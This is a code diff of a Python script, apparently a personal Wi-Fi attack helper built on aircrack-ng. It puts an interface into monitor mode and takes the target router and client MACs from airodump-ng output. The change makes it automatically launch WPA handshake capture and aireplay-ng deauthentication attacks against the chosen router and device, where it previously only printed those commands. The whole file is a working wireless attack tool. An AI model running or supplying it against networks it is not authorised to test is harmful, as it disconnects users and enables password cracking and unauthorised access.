@@ -1,22 +1,12 @@
 import os
 import subprocess
 import json
+import time
 
 from target import Target
 
-'''
-todo
-- creating CSV to get best wifi results (based on signal and connected devices from airmon-ng)
-'''
-
-# temp - replace with config and object
-
-INTERFACE = None
-ROUTER_MAC = None
-ROUTER_SSID = None
-DEVICE_MAC = None
-
 target=Target()
+os.environ['XDG_RUNTIME_DIR'] = '/tmp/runtime-root'
 
 COMMANDS = {
     'help' : 'Shows this help message',
@@ -30,9 +20,10 @@ COMMANDS = {
 def load_config(file_path):
     with open(file_path,'r') as config_file:
             config_data=json.load(config_file)
-            print('--- configuration ---')
+            print('\nloading configuration ...\n-----')
             for line in config_data:
                 print(line + ':\t' + config_data.get(line))
+            print('-----\n')
             return config_data
 
 def main(config_param):
@@ -57,18 +48,18 @@ def main(config_param):
 
         elif user_input.lower() == 'craft':
             get_data()
-            print_data()
-            prepare_output_folder()
+            print_data(config_param)
+            prepare_output_folder(config_param)
 
         elif user_input.lower() == 'start':
             get_interface(config_param)
             start_monitoring_mode()
             get_data()
-            print_data()
-            prepare_output_folder()
+            print_data(config_param)
+            prepare_output_folder(config_param)
 
 def get_interface(config_param):
-    print(f'Searching for {config_param.get('ap_dongle')} ...')
+    print(f'\nSearching for {config_param.get('ap_dongle')} ...')
     airmon_output = subprocess.run(['sudo', 'airmon-ng'], capture_output=True, text=True)
     result=airmon_output.stdout
     lines=result.split('\n')
@@ -79,7 +70,7 @@ def get_interface(config_param):
     print(f'Success! Found interface: {target.interface}')
 
 def start_monitoring_mode():
-    print(f'Starting monitoring mode ...')
+    print(f'\nStarting monitoring mode ...')
     commands = [
         f'sudo ifconfig {target.interface} down',
         f'sudo iwconfig {target.interface} mode monitor',
@@ -88,28 +79,23 @@ def start_monitoring_mode():
     for command in commands:
         print(f'hawk_tuah$ {command}')
         os.system(command)
+        time.sleep(2)
     
 def get_data():
-    global INTERFACE
-    global ROUTER_MAC
-    global DEVICE_MAC
-    global ROUTER_SSID
-    global CHANNEL
-    
-    while True:
-        print(f'\nperform:\nsudo airodump-ng {target.interface}')
-        subprocess.run(['qterminal', '-e', f'bash -c "sudo airodump-ng {target.interface}; exec bash"'])
-        print('^copy the line of the selected target\n^filter with \'a\' key for \'sta only\' to see paired devices\n')
-        user_input=input()
-        macs=user_input.split()
-        target.router_mac=macs[0]
-        target.device_mac=macs[1]
-        print(f'\nperform:\nsudo airodump-ng {target.interface} --bssid {target.router_mac}')
-        subprocess.run(['qterminal', '-e', f'sudo airodump-ng {target.interface} --bssid {target.router_mac}'])
-        print('^copy first line to get router details\n')
-        user_input=input()
-        if user_input != 'back':
-            break
+
+    print(f'\nhawk_tuah$ sudo airodump-ng {target.interface}')
+    subprocess.run(['qterminal', '-e', f'bash -c "sudo airodump-ng {target.interface}; exec bash"'])
+    print('# copy the line of the selected target\n# filter with \'a\' key for \'sta only\' to see paired devices\n')
+
+    user_input=input()
+    macs=user_input.split()
+    target.router_mac=macs[0]
+    target.device_mac=macs[1]
+
+    print(f'\nhawk_tuah$ : sudo airodump-ng {target.interface} --bssid {target.router_mac}')
+    subprocess.run(['qterminal', '-e', f'bash -c "sudo airodump-ng {target.interface} --bssid {target.router_mac}; exec bash"'])
+    print('# copy first line to get router details\n')
+    user_input=input()
     target.router_ssid=user_input.split()[10]
     target.channel=user_input.split()[5]
 
@@ -128,10 +114,13 @@ def print_data(config_param):
 
     print('\n--- crafting commands ---')
     print('\n-- monitor handshake --')
-    print(f'sudo airodump-ng -c {target.channel} --bssid {target.router_mac} -w {config_param.get('cap_dir')}/{target.router_ssid}/{target.router_ssid} wlan1')
+    print(f'sudo airodump-ng -c {target.channel} --bssid {target.router_mac} -w {config_param.get('cap_dir')}/{target.router_ssid}/{target.router_ssid} {target.interface}')
 
     print('\n-- send deauth packets --')
     print(f'sudo aireplay-ng -0 1 -a {target.router_mac} -c {target.device_mac} {target.interface}')
+
+    subprocess.run(['qterminal', '-e', f'bash -c "sudo airodump-ng -c {target.channel} --bssid {target.router_mac} -w {config_param.get('cap_dir')}/{target.router_ssid}/{target.router_ssid} {target.interface}"'])
+    subprocess.run(['qterminal', '-e', f'bash -c "sudo aireplay-ng -0 1 -a {target.router_mac} -c {target.device_mac} {target.interface}"'])
 
 if __name__=='__main__':
     config=load_config('config.json')
